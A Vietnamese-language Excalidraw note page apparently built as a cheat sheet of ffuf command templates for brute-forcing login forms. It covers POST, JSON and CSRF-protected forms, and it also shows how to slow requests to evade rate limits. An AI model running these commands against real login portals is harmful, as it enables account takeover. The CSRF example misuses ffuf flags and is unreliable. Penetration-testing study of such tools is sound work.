---
title: "template fuff dùng cho cổng đăng nhập"
tags:
  - excalidraw
  - mindmap
---


<div class="excalidraw-container" id="ex-h00xzs">
  <div class="excalidraw-toolbar">
    <div class="excalidraw-badge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
      <span>Excalidraw Mindmap</span>
    </div>
    <div class="excalidraw-controls">
      <button type="button" class="excalidraw-btn zoom-in" title="Phóng to">🔍+</button>
      <button type="button" class="excalidraw-btn zoom-out" title="Thu nhỏ">🔍-</button>
      <button type="button" class="excalidraw-btn zoom-reset" title="Vừa màn hình">↺</button>
      <button type="button" class="excalidraw-btn fullscreen" title="Toàn màn hình">⛶</button>
    </div>
  </div>
  <div class="excalidraw-viewport">
    <div class="excalidraw-canvas-wrapper">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1219 3821" class="excalidraw-svg" data-width="1219" data-height="3821">
<g transform="translate(125.62,1772.48)">

<rect x="-8.45166913200842" y="-1067.9263512106504" width="800" height="3076" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="-8.45166913200842" y="-1067.9263512106504" width="800" height="3076" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">1. Template cơ bản – Brute force username &amp; password (POST form)</span>
      </div>
      <a href="#doc-2c4637f01ee05012e84a079b3aedc1ac98ee7584" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Dưới đây là một số template dùng <strong>ffuf</strong> để brute force cổng đăng nhập (login form) mà bạn có thể tham khảo. Tùy vào cấu trúc form và phản hồi của server, bạn điều chỉnh các tham số cho phù hợp.</p>
<hr>
<h2>1. Template cơ bản – Brute force username &amp; password (POST form)</h2>
<p>Giả sử form login có 2 trường <code>username</code> và <code>password</code>, server trả về mã 401 khi sai thông tin.</p>
<pre><code class="language-bash">ffuf -w /path/to/usernames.txt:USER -w /path/to/passwords.txt:PASS \
     -X POST \
     -d &quot;username=USER&amp;password=PASS&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fc 401
</code></pre>
<p><strong>Giải thích:</strong></p>
<ul>
<li><code>-w</code> : đường dẫn tới wordlist, gán alias <code>USER</code> và <code>PASS</code>.</li>
<li><code>-X POST</code> : sử dụng method POST.</li>
<li><code>-d</code> : dữ liệu gửi đi, <code>USER</code> và <code>PASS</code> sẽ được thay bằng giá trị từ wordlist.</li>
<li><code>-H</code> : header xác định kiểu dữ liệu form.</li>
<li><code>-u</code> : URL endpoint login.</li>
<li><code>-fc 401</code> : lọc bỏ các response có status code 401 (sai thông tin), chỉ hiển thị các response khác (có thể là thành công).</li>
</ul>
<hr>
<h2>2. Lọc theo kích thước response (thay vì status code)</h2>
<p>Nhiều ứng dụng trả về cùng status code (vd 200) cho cả đúng/sai, nhưng nội dung khác nhau. Bạn có thể lọc theo <code>-fs</code> (filter size) hoặc <code>-fw</code> (filter words).</p>
<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d &quot;user=USER&amp;pass=PASS&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fs 1234
</code></pre>
<ul>
<li><code>-fs 1234</code> : bỏ qua các response có kích thước 1234 bytes (kích thước của trang báo lỗi).</li>
<li>Bạn có thể dùng <code>-fw</code> để lọc theo số từ, hoặc <code>-fl</code> theo số dòng.</li>
</ul>
<hr>
<h2>3. Login form có thêm CSRF token</h2>
<p>Nếu form có CSRF token, bạn cần lấy token từ GET request trước, sau đó dùng <code>ffuf</code> với chế độ <code>-mode clusterbomb</code> và sử dụng <code>-x</code> (extensions) hoặc dùng <code>ffuf</code> kết hợp với script tạo token. Tuy nhiên đơn giản nhất là dùng <code>ffuf</code> với chức năng <strong>recursion</strong> và <strong>dynamic values</strong> (từ phiên bản mới). Ví dụ nâng cao:</p>
<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
     -u http://target.com/login \
     -X POST \
     -d &quot;username=USER&amp;password=PASS&amp;csrf=CSRF&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -mode clusterbomb \
     -x http://target.com/get_token \
     -mr &quot;token=(.*?)&quot; \
     -replay-proxy http://127.0.0.1:8080
</code></pre>
<p>Cách này phức tạp, thường phải dùng script riêng hoặc <code>Burp Intruder</code>. Với ffuf, bạn có thể tạo token tĩnh nếu token không thay đổi giữa các request (ít gặp).</p>
<hr>
<h2>4. Login API trả về JSON</h2>
<p>Nếu ứng dụng gửi/nhận JSON, bạn chỉnh <code>-H</code> và <code>-d</code> tương ứng:</p>
<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d &#39;{&quot;username&quot;:&quot;USER&quot;,&quot;password&quot;:&quot;PASS&quot;}&#39; \
     -H &quot;Content-Type: application/json&quot; \
     -u http://target.com/api/login \
     -fc 401
</code></pre>
<ul>
<li>Lưu ý: dùng dấu nháy đơn <code>&#39;</code> bao quanh data nếu trong đó có dấu nháy kép <code>&quot;</code>.</li>
</ul>
<hr>
<h2>5. Brute force chỉ username (password cố định) hoặc ngược lại</h2>
<p>Nếu bạn đã biết một trong hai, chỉ cần một wordlist và thay trực tiếp giá trị còn lại:</p>
<pre><code class="language-bash"># Chỉ brute username, password cố định là &quot;admin123&quot;
ffuf -w users.txt:USER \
     -X POST \
     -d &quot;username=USER&amp;password=admin123&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fc 401

# Chỉ brute password, username cố định là &quot;admin&quot;
ffuf -w passes.txt:PASS \
     -X POST \
     -d &quot;username=admin&amp;password=PASS&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fc 401
</code></pre>
<hr>
<h2>6. Thêm delay để tránh bị chặn (rate limit)</h2>
<p>Dùng <code>-p</code> để thêm delay giữa các request (tính bằng giây):</p>
<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d &quot;username=USER&amp;password=PASS&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fc 401 \
     -p 0.5
</code></pre>
<ul>
<li><code>-p 0.5</code> : chờ 0.5 giây giữa mỗi request.</li>
</ul>
<hr>
<h2>7. Sử dụng proxy để quan sát request (debug)</h2>
<p>Thêm <code>-x http://127.0.0.1:8080</code> để gửi request qua Burp Suite:</p>
<pre><code class="language-bash">ffuf -w users.txt:USER -w passes.txt:PASS \
     -X POST \
     -d &quot;username=USER&amp;password=PASS&quot; \
     -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
     -u http://target.com/login \
     -fc 401 \
     -x http://127.0.0.1:8080
</code></pre>
<hr>
<h2>Lưu ý quan trọng</h2>
<ul>
<li><strong>Chỉ sử dụng trên hệ thống bạn có quyền kiểm tra.</strong></li>
<li>Nên dùng wordlist phù hợp (vd: SecLists).</li>
<li>Nếu server trả về quá nhiều response giống nhau, hãy phân tích kỹ response thành công (có thể chứa chuỗi đặc biệt) rồi dùng <code>-mr</code> (match regex) thay vì filter.</li>
<li>Nếu form có thêm field ẩn, hãy kiểm tra source HTML và thêm vào <code>-d</code>.</li>
</ul>
<hr>
<p>Hy vọng các template trên giúp bạn bắt đầu brute force login bằng ffuf hiệu quả. Nếu cần tùy chỉnh thêm, hãy tham khảo tài liệu chính thức: <code>ffuf -h</code>.</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(125.62,1772.48)">
<path d="M624.59 -795.70 L624.97 -794.86 L626.41 -794.58 L629.61 -794.16 L632.43 -794.02 L635.19 -793.95 L637.89 -793.88 L640.53 -793.88 L643.10 -793.88 L644.42 -793.88 L646.49 -793.88 L648.37 -793.88 L649.81 -793.95 L651.07 -794.02 L652.57 -794.09 L653.77 -794.16 L655.02 -794.30 L656.21 -794.51 L656.21 -794.51" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M657.15 -803.74 L656.53 -804.51 L657.15 -805.21 L658.03 -804.79 L659.48 -803.74 L660.92 -802.34 L662.11 -800.94 L662.93 -799.41 L663.37 -798.08 L663.43 -796.75 L663.30 -795.56 L662.17 -793.32 L661.48 -792.35 L659.66 -790.46 L657.41 -788.78 L653.64 -786.75 L651.32 -785.99 L650.38 -785.71 L650.38 -785.71" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M699.38 -803.46 L698.57 -802.97 L697.62 -802.62 L696.50 -802.76 L696.18 -803.88 L696.37 -805.06 L696.87 -805.90 L697.50 -806.53 L698.82 -806.39 L699.32 -805.34 L699.32 -803.67 L699.07 -801.85 L698.38 -799.41 L697.62 -797.17 L696.68 -794.93 L695.87 -793.19 L694.93 -791.86 L694.17 -790.81 L693.30 -790.18 L692.23 -789.76 L690.97 -789.90 L690.35 -790.60 L690.03 -791.51 L690.03 -792.77 L690.28 -793.74 L691.04 -794.30 L692.23 -794.09 L693.42 -793.67 L694.49 -793.25 L696.43 -792.48 L697.37 -792.13 L698.88 -791.58 L700.13 -791.16 L701.26 -790.74 L702.64 -790.46 L702.64 -790.46" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M719.77 -799.19 L720.21 -798.15 L720.46 -797.17 L720.72 -795.91 L720.97 -794.51 L721.28 -793.25 L721.66 -792.13 L721.91 -791.16 L722.66 -790.46 L723.60 -791.02 L724.54 -792.13 L725.55 -794.09 L726.30 -795.98 L726.86 -797.38 L727.30 -798.50 L727.81 -799.68 L728.24 -800.66 L729.00 -800.10 L729.31 -798.84 L729.56 -797.59 L729.94 -796.19 L730.19 -795.00 L730.57 -793.12 L731.01 -791.65 L731.26 -790.46 L731.57 -789.55 L732.01 -788.57 L732.89 -788.01 L733.64 -788.64 L734.52 -790.25 L735.40 -792.42 L735.71 -793.32 L736.40 -794.86 L736.84 -796.05 L737.22 -796.96 L737.66 -798.08 L738.10 -798.99 L738.10 -798.99" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M744.93 -801.08 L743.74 -801.22 L742.93 -800.45 L742.24 -799.61 L741.73 -798.50 L741.30 -797.31 L741.04 -796.05 L741.11 -794.44 L741.73 -793.46 L742.74 -793.19 L743.74 -793.67 L744.24 -794.51 L744.50 -795.63 L744.56 -796.89 L744.56 -796.89" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M746.94 -792.70 L748.07 -793.19 L748.95 -794.02 L749.95 -795.14 L751.15 -796.96 L752.15 -798.77 L752.59 -799.61 L753.22 -800.94 L753.59 -801.92 L754.03 -803.11 L754.35 -804.15 L754.53 -802.76 L754.85 -801.64 L755.29 -800.59 L755.79 -799.68 L756.48 -798.77 L757.23 -797.93 L758.30 -796.89 L758.99 -796.33 L760.12 -795.35 L761.12 -794.72 L762.06 -794.16 L762.88 -793.74 L764.13 -793.46 L765.52 -793.32 L766.71 -793.61 L767.59 -794.16 L768.09 -794.93 L768.53 -795.91 L768.53 -797.17 L767.52 -797.45 L766.58 -797.03 L766.08 -796.12 L766.33 -794.93 L767.33 -794.51 L768.34 -794.86 L770.28 -796.12 L772.10 -797.73 L773.67 -799.82 L775.05 -802.34 L776.12 -805.41 L776.81 -808.84 L777.50 -813.94 L777.75 -816.88 L777.88 -818.20 L778.00 -820.30 L778.00 -821.84 L777.75 -822.95 L777.31 -823.86 L776.18 -823.37 L775.12 -820.30 L774.36 -817.72 L773.73 -814.99 L773.36 -812.26 L772.92 -809.40 L772.73 -806.74 L772.48 -804.15 L772.48 -802.06 L772.42 -800.24 L772.48 -798.64 L772.61 -797.31 L772.67 -796.12 L772.86 -794.72 L773.23 -793.74 L773.23 -793.74" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M788.17 -817.43 L788.35 -818.55 L787.60 -816.04 L787.16 -813.17 L786.97 -811.63 L786.72 -808.56 L786.60 -805.48 L786.47 -802.62 L786.47 -801.36 L786.47 -799.26 L786.47 -796.12 L786.60 -794.72 L786.85 -793.67 L787.79 -794.09 L788.35 -794.86 L788.92 -795.77 L789.73 -796.96 L790.11 -797.80 L790.74 -799.26 L791.12 -800.45 L791.49 -801.36 L791.81 -802.34 L791.62 -801.01 L791.74 -799.68 L791.81 -798.43 L791.99 -797.31 L791.99 -797.31" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M796.39 -808.84 L796.13 -809.96 L796.13 -809.96" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M799.96 -805.97 L799.33 -806.60 L798.08 -806.25 L797.39 -805.62 L796.95 -804.79 L797.01 -803.39 L797.64 -802.48 L798.33 -801.50 L799.84 -799.82 L800.84 -798.64 L801.59 -797.66 L802.10 -796.82 L802.72 -795.70 L802.97 -794.44 L802.60 -793.46 L801.84 -792.70 L800.84 -792.42 L800.40 -793.25 L800.40 -793.25" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M811.88 -808.84 L811.82 -807.58 L811.57 -806.39 L810.94 -801.50 L810.69 -799.06 L810.63 -796.96 L810.57 -795.14 L810.57 -793.53 L810.57 -792.07 L810.63 -790.46 L810.63 -789.20 L810.63 -789.20" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M807.74 -794.44 L807.55 -795.56 L807.81 -796.54 L808.50 -797.31 L811.38 -798.57 L813.64 -799.26 L814.83 -799.47 L817.09 -799.89 L819.04 -800.10 L819.04 -800.10" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M834.66 -795.49 L835.48 -794.93 L835.48 -794.93" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M368.53 -760.41 L369.28 -760.90 L370.41 -760.55 L371.41 -760.34 L374.11 -759.85 L376.68 -759.71 L379.26 -759.64 L380.51 -759.64 L382.58 -759.64 L384.53 -759.71 L386.22 -759.71 L389.86 -759.78 L391.05 -759.85 L393.12 -759.99 L394.94 -760.20 L397.89 -760.55 L399.15 -760.76 L401.59 -761.25 L402.66 -761.39 L404.48 -761.81 L405.73 -762.09 L406.80 -762.30 L408.06 -762.51 L409.25 -762.72 L409.25 -762.72" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M412.20 -772.01 L412.89 -771.24 L413.39 -770.47 L413.83 -769.56 L413.89 -767.96 L413.39 -766.28 L411.95 -764.04 L409.62 -761.39 L405.86 -758.73 L401.22 -756.08 L399.15 -755.10 L397.01 -754.12 L397.01 -754.12" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M545.97 -771.45 L545.53 -772.29 L544.97 -771.24 L544.90 -768.37 L544.78 -765.44 L544.72 -763.83 L544.59 -760.76 L544.53 -757.61 L544.46 -754.68 L544.46 -751.95 L544.53 -750.00 L544.53 -748.53 L544.72 -746.99 L544.78 -748.18 L544.59 -751.12 L544.28 -754.68 L544.09 -758.31 L544.02 -761.81 L544.09 -765.09 L544.34 -768.17 L544.90 -770.89 L545.53 -773.34 L546.53 -775.50 L547.73 -777.25 L548.86 -778.37 L550.05 -778.93 L551.43 -778.86 L552.43 -778.16 L553.00 -777.11 L553.00 -775.72 L552.75 -774.04 L551.87 -771.80 L550.68 -769.63 L549.42 -767.75 L547.92 -766.07 L546.41 -764.46 L545.72 -763.83 L544.72 -762.72 L543.96 -762.02 L543.27 -761.18 L543.27 -761.18" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M558.46 -767.61 L558.14 -766.49 L557.70 -765.30 L557.33 -763.90 L557.20 -762.57 L557.20 -761.32 L557.33 -760.13 L557.89 -759.29 L558.90 -759.01 L560.59 -760.34 L561.66 -762.57 L562.47 -765.37 L562.72 -766.91 L563.04 -769.63 L563.10 -770.82 L563.10 -772.78 L562.91 -774.11 L562.41 -775.15 L562.41 -775.15" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M574.58 -768.24 L574.39 -769.35 L573.45 -769.63 L572.26 -769.42 L571.19 -769.01 L569.00 -767.19 L568.06 -766.07 L567.55 -764.88 L567.37 -763.34 L567.74 -762.02 L568.18 -760.76 L568.56 -759.71 L569.00 -758.73 L569.44 -757.75 L569.81 -756.92 L570.19 -755.87 L569.94 -754.68 L569.25 -753.91 L568.31 -753.56 L567.37 -753.91 L567.37 -753.91" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M582.93 -771.03 L583.49 -770.19 L583.49 -768.52 L583.24 -766.21 L583.05 -763.48 L582.99 -762.15 L582.93 -759.85 L582.80 -757.96 L582.80 -756.29 L582.80 -754.89 L582.80 -753.28 L582.80 -753.28" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M579.60 -768.52 L579.35 -769.56 L579.73 -770.47 L580.73 -771.03 L582.17 -771.17 L585.19 -771.03 L588.13 -770.61 L588.13 -770.61" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M612.23 -763.34 L611.60 -763.90 L610.85 -763.28 L610.41 -762.22 L610.16 -760.97 L609.91 -759.64 L609.72 -758.31 L609.53 -757.12 L609.41 -755.93 L609.15 -754.82 L607.96 -755.03 L607.65 -755.93 L607.71 -757.19 L608.53 -757.68 L609.53 -757.96 L610.72 -758.17 L613.11 -758.87 L614.17 -759.29 L615.74 -760.06 L617.06 -760.83 L618.00 -761.46 L618.82 -762.22 L619.32 -762.99 L619.82 -763.76 L620.39 -764.74 L620.89 -765.72 L620.76 -764.25 L620.20 -760.97 L619.82 -759.15 L619.51 -757.54 L619.32 -756.15 L619.07 -754.89 L619.01 -753.49 L619.01 -753.49" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M632.43 -761.18 L632.50 -759.64 L632.31 -758.03 L632.24 -756.70 L632.06 -755.24 L631.99 -753.98 L631.81 -752.86 L631.81 -752.86" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M628.10 -760.83 L628.48 -761.88 L629.04 -762.72 L629.80 -763.48 L630.61 -764.04 L631.49 -764.46 L632.50 -764.67 L633.69 -764.88 L634.75 -765.02 L635.95 -765.16 L637.20 -765.30 L638.14 -764.95 L638.58 -764.11 L638.83 -762.57 L639.02 -761.18 L639.15 -758.38 L639.27 -757.19 L639.33 -755.17 L639.40 -753.49 L639.52 -752.09 L639.52 -750.55 L639.59 -749.37 L639.65 -748.18 L639.40 -749.44 L639.08 -752.44 L638.77 -755.17 L638.39 -757.61 L638.21 -759.57 L638.08 -761.18 L637.95 -762.30 L637.89 -763.76 L637.95 -764.95 L638.21 -765.93 L638.90 -766.98 L639.90 -767.47 L641.34 -767.61 L642.72 -767.61 L644.04 -767.54 L645.30 -767.54 L646.68 -767.54 L647.74 -767.33 L648.12 -766.21 L648.12 -764.60 L648.12 -763.06 L648.18 -759.99 L648.24 -758.80 L648.37 -756.70 L648.37 -755.10 L648.43 -753.70 L648.50 -752.30 L648.50 -750.97 L648.12 -752.02 L648.12 -755.03 L648.43 -759.29 L648.62 -760.55 L648.87 -762.57 L649.31 -764.25 L649.81 -765.51 L650.38 -766.63 L650.94 -767.40 L651.88 -768.24 L652.89 -768.66 L654.08 -768.52 L654.83 -767.96 L655.46 -767.19 L655.84 -766.28 L655.96 -764.95 L655.59 -763.90 L653.33 -762.09 L651.57 -761.81 L651.57 -761.81" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M465.09 -771.52 L464.78 -772.43 L464.40 -773.62 L463.65 -772.92 L463.15 -768.59 L462.90 -766.14 L462.71 -764.04 L462.64 -762.30 L462.64 -760.90 L462.64 -759.22 L462.64 -757.68 L462.21 -758.73 L462.08 -760.06 L461.89 -761.60 L461.89 -763.06 L461.95 -764.53 L462.21 -766.21 L462.46 -767.33 L463.59 -770.26 L464.34 -771.17 L465.03 -771.87 L466.03 -772.29 L467.22 -772.22 L468.04 -771.66 L468.54 -770.89 L468.35 -769.84 L467.98 -769.01 L467.29 -768.02 L466.53 -767.19 L465.84 -766.56 L465.28 -765.86 L464.65 -765.16 L465.15 -764.32 L466.10 -763.90 L466.85 -763.41 L467.60 -762.72 L468.35 -761.88 L468.98 -760.97 L469.42 -759.85 L469.67 -758.73 L469.55 -757.54 L469.17 -756.42 L468.04 -754.89 L466.85 -753.98 L465.66 -753.42 L464.15 -753.42 L462.90 -753.84 L461.95 -754.54 L461.58 -755.73 L461.58 -755.73" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M478.58 -758.45 L478.39 -759.64 L477.77 -760.48 L476.39 -760.41 L475.63 -759.71 L475.19 -758.87 L474.94 -757.54 L475.19 -756.29 L475.88 -755.45 L476.82 -755.10 L477.83 -755.45 L478.39 -756.29 L478.52 -757.41 L478.02 -758.31 L477.26 -758.80 L477.26 -758.80" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M490.32 -760.20 L490.00 -761.25 L488.87 -761.39 L487.87 -761.04 L486.99 -760.48 L486.24 -759.64 L485.61 -758.80 L485.11 -757.89 L484.67 -756.84 L485.48 -756.42 L486.68 -757.41 L488.18 -759.36 L489.44 -761.74 L490.63 -764.53 L491.76 -767.54 L492.70 -770.61 L493.08 -772.01 L493.77 -774.81 L494.21 -777.11 L494.46 -778.79 L494.71 -780.04 L494.83 -781.44 L494.58 -782.49 L494.02 -781.65 L493.26 -778.44 L492.70 -775.78 L492.01 -771.94 L491.76 -769.21 L491.76 -766.91 L491.76 -764.95 L491.88 -763.28 L492.39 -760.55 L492.76 -758.80 L493.26 -757.54 L493.77 -756.50 L494.77 -755.87 L496.21 -755.87 L497.15 -756.50 L498.60 -758.10 L499.66 -760.06 L500.54 -762.15 L500.86 -763.06 L501.36 -764.53 L501.67 -765.72 L501.92 -766.91 L500.92 -766.56 L500.79 -765.30 L500.79 -763.83 L501.04 -762.86 L501.42 -762.02 L502.11 -761.39 L503.37 -761.32 L504.50 -761.74 L505.00 -762.51 L505.50 -763.34 L505.94 -764.25 L505.81 -762.72 L505.94 -761.39 L505.81 -759.85 L505.81 -758.45 L505.75 -757.12 L505.69 -755.87 L505.37 -754.82 L505.00 -753.98 L504.24 -753.42 L503.12 -753.70 L502.42 -754.47 L502.11 -755.52 L502.55 -756.50 L504.50 -757.68 L506.69 -758.59 L509.14 -759.29 L510.27 -759.64 L510.27 -759.64" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<text x="629.84" y="-646.15" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="629.84" dy="0">h</tspan></text>
</g>
<g transform="translate(125.62,1772.48)">
<text x="923.05" y="-1056.61" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="923.05" dy="0">h</tspan></text>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M56.73 -693.59 L55.78 -693.16 L55.14 -692.45 L55.78 -691.60 L56.79 -691.03 L57.94 -690.61 L60.55 -689.83 L62.27 -689.34 L63.73 -688.98 L65.00 -688.70 L66.21 -688.56 L67.74 -688.34 L69.26 -688.34 L70.66 -688.34 L72.13 -688.56 L74.23 -688.70 L75.24 -688.98 L76.96 -689.19 L78.49 -689.55 L79.82 -689.90 L80.97 -690.25 L82.12 -690.61 L83.13 -690.89 L84.41 -691.32 L85.61 -691.81 L86.63 -692.24 L87.59 -692.53 L88.67 -692.95 L89.75 -693.30 L89.75 -693.30" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M100.31 -684.09 L99.29 -684.37 L98.02 -684.45 L97.38 -683.74 L97.70 -682.60 L98.47 -681.18 L100.06 -679.27 L102.22 -677.64 L104.95 -675.94 L108.39 -674.60 L112.14 -673.32 L118.00 -672.05 L121.56 -671.34 L123.34 -671.13 L126.78 -670.77 L130.08 -670.49 L133.14 -670.49 L135.81 -670.56 L137.78 -670.77 L139.25 -670.98 L140.45 -671.27 L141.34 -671.62 L142.30 -672.19 L142.30 -672.19" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M140.58 -680.27 L141.98 -680.05 L142.49 -679.27 L142.74 -678.21 L142.68 -675.80 L141.85 -673.25 L140.77 -670.70 L139.12 -668.29 L136.76 -665.81 L133.84 -663.33 L130.66 -661.28 L127.79 -659.79 L126.59 -659.29 L126.59 -659.29" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M177.61 -668.29 L176.53 -668.08 L177.04 -669.07 L178.31 -670.35 L179.07 -671.13 L180.98 -673.32 L182.19 -674.88 L183.02 -676.16 L183.72 -677.15 L184.22 -678.00 L184.73 -678.99 L185.18 -679.91 L184.54 -679.20 L184.29 -677.93 L183.78 -673.82 L183.59 -670.91 L183.27 -667.94 L183.02 -664.96 L182.76 -662.20 L182.57 -660.85 L182.32 -658.72 L182.06 -656.81 L181.81 -655.25 L181.55 -653.98 L181.23 -652.91 L180.85 -651.85 L180.28 -650.65 L178.75 -649.02 L177.61 -648.17 L176.59 -647.74 L175.32 -647.53 L174.24 -647.67 L173.85 -648.74 L174.81 -650.50 L176.59 -653.34 L177.29 -654.26 L178.82 -656.03 L180.28 -657.94 L181.81 -659.79 L183.33 -661.63 L184.73 -663.40 L186.07 -665.10 L187.09 -666.38 L187.91 -667.44 L188.55 -668.29 L189.06 -669.07 L189.82 -669.99 L190.46 -670.77 L191.03 -671.62 L191.67 -672.47 L191.54 -671.13 L191.29 -669.99 L191.03 -668.79 L190.78 -667.65 L190.65 -666.45 L190.40 -665.10 L190.20 -663.90 L190.20 -663.90" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M192.30 -677.15 L191.92 -678.21 L191.54 -679.13 L191.54 -679.13" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
<path d="M201.72 -682.74 L201.59 -683.95 L200.64 -683.24 L199.87 -681.12 L198.98 -678.71 L198.22 -676.16 L197.46 -673.67 L196.95 -671.20 L196.63 -668.79 L196.44 -667.01 L196.38 -665.60 L196.25 -664.39 L196.38 -663.26 L197.20 -662.62 L198.92 -663.82 L200.70 -665.81 L200.70 -665.81" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(125.62,1772.48)">
